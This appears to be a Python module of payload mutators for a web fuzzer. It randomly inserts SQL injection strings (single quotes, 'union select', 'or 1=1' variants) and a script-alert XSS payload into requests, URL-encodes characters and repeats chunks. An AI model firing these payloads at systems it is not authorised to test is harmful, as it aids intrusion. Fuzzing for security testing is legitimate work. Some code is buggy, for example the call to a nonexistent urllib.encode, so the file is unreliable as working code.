import random

def maybe_encode(data, probability=50, ignore=["+"]):
    result = ""
    
    for d in data:
        if random.randint(0,100) < probability and d not in ignore:
            result += urllib.encode(d)
        else:
            result += d
            
    return result


def double_or_nothing(original_payload, negative_chance=50):
    num = int(original_payload)
    
    # "Double or Nothing" random number
    num = random.randint(0, num*2)

    # Sometimes negative
    if random.randint(0, 100) < negative_chance:
        num *= -1
        
    return str(num)
    
    
def sql_injection2(original_payload):

    sql_statement = "+union+select+1,2,3/*"
    
    sql_statement = maybe_encode(sql_statement)
    
    return original_payload + sql_statement;
    

def sql_injection(original_payload):    
    # select a random offset in the payload to mutate
    offset = random.randint(0, len(original_payload) - 1)
    payload = original_payload[:offset]
    
    # random offset insert a SQL injection attempt
    payload += "'"
    
    # add the remaining bits of the payload
    payload += original_payload[offset:]
    
    return payload
   

def xss_attempt(original_payload):
    # select a random offset in the payload to mutate
    offset = random.randint(0, len(original_payload) - 1)
    payload = original_payload[:offset]
    
    # random offset insert a SQL injection attempt
    payload += "<script>alert('XSS!')</script>"
    
    # add the remaining bits of the payload
    payload += original_payload[offset:]
    
    return payload
 

def basic_replace(original_payload):
    replace_list = [
        "<script>alert('XSS!')</script>",
        "alert('XSS!');",
    ]
    
    mysql_list = [
        '" or 1=1;#\' or 1=1;#',
    ]
    
    mssql_list = [
        '" or 1=1;--\' or 1=1;--',
    ]
    
    # mysql list
    replace_list += mysql_list
    
    # MSSQL list
    # replace_list += mssql_list
    
    return replace_list[random.randint(0, len(replace_list) - 1)]
 
    
def chunk_repeater(original_payload):
    # select a random offset in the payload to mutate
    offset = random.randint(0, len(original_payload) - 1)
    payload = original_payload[:offset]
    
    try:
        chunk_length = random.randint(len(payload[offset:]), len(payload) - 1)
        repeater = random.randint(1, 10)
    
        # repeat the chunk based on the randomly chosen length
        for i in range(repeater):
            payload += original_payload[offset:offset+chunk_length]
            
        # add the remaining bits of the payload
        payload += original_payload[offset:]

    except ValueError:
        payload = original_payload
        
    return payload